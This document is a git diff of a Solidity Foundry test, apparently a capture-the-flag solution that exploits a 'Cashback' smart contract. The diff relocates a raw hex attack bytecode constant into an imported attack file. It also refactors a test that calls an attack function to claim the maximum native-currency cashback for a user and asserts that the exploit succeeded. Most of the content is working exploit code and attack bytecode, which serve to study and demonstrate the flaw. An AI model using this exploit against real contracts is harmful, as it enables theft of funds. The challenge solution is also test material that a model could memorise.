@@ -10,13 +10,10 @@ import {
     FREEDOM_CASHBACK_RATE,
     FREEDOM_MAX_CASHBACK,
     FREEDOM_ADDR,
-    SUPER_NFT_ADDR
+    SUPER_NFT_ADDR,
+    ATTACK_CREATION_BYTECODE
 } from "./CashbackAttack.sol";
-import {Test, console} from "forge-std/Test.sol";
-
-// Cashback contract addr: 0xdCc409Af2566c47F6DA4d30Eae8155b332A64078
-bytes constant ATTACK_CREATION_BYTECODE =
-    hex"61022f8061000d5f39805ff3fe603756dcc409af2566c47f6da4d30eae8155b332a6407800000000000000000000000000000000000000000000000000000000000000005b6100413415610219565b610049610168565b6361bd21b2811461007957638380edb7811461012f5763f360c183811461013c576334b151188114610151575f5ffd5b6100825f6101b0565b61008c60016101b0565b61009660026101b0565b6100a0600261018f565b6100aa600361018f565b6100b4600461018f565b604051600461022b823984600482015282602482015260445f5f82845f8c5af16100dd81610219565b81830160405260405192506004610227843930600484015287602484015285604484015283606484015260a060848401525f60a484015260c491505f5f83855f8d5af1905061012b81610219565b5f5ff35b6101376101ea565b610162565b61014d6101485f61018f565b61020c565b5f5ff35b61016161015c6101fd565b6101e2565b5b50610225565b5f7c01000000000000000000000000000000000000000000000000000000005f3504905090565b5f60208202600401602081013610156101a6575f5ffd5b8035915050919050565b5f6101ba8261018f565b905073ffffffffffffffffffffffffffffffffffffffff198116156101dd575f5ffd5b919050565b805f5260205ff35b6101f460016101e2565b565b5f5f905090565b5f6102066101f6565b54905090565b806102156101f6565b5550565b80610222575f5ffd5b50565bfef242432aebc39613";
+import {Test} from "forge-std/Test.sol";
 
 // forge-lint: disable-next-item(asm-keccak256)
 contract SolveCashback is Test {
@@ -66,7 +63,11 @@ contract SolveCashback is Test {
         vm.stopPrank();
     }
 
-    function _updateCashbackAddrInCode(bytes memory code, address cashbackAddr) internal pure returns (bytes memory creation) {
+    function _updateCashbackAddrInCode(bytes memory code, address cashbackAddr)
+        internal
+        pure
+        returns (bytes memory creation)
+    {
         uint256 byteAddrStart = 16;
         creation = code;
 
@@ -87,14 +88,13 @@ contract SolveCashback is Test {
         vm.startPrank(alice, alice);
 
         // native currency
-        address currency = Currency.unwrap(CurrencyLibrary.NATIVE_CURRENCY);
+        address currencyAddr = Currency.unwrap(CurrencyLibrary.NATIVE_CURRENCY);
         uint256 expenseAmt = NATIVE_MAX_CASHBACK * BASIS_POINTS / NATIVE_CASHBACK_RATE;
-        cc.attack(address(cashback), alice, currency, expenseAmt, NATIVE_MAX_CASHBACK);
+        cc.attack(address(cashback), alice, currencyAddr, expenseAmt, NATIVE_MAX_CASHBACK);
 
-        // Confirm the state
-        uint256 nativeCashback = cashback.balanceOf(alice, CurrencyLibrary.NATIVE_CURRENCY.toId());
-        console.log("nativeCashback: %s", nativeCashback);
-        assertEq(nativeCashback, NATIVE_MAX_CASHBACK);
+        // native currency: check the state
+        uint256 cashbackAmt = cashback.balanceOf(alice, CurrencyLibrary.NATIVE_CURRENCY.toId());
+        assertEq(cashbackAmt, NATIVE_MAX_CASHBACK);
 
         vm.stopPrank();
     }
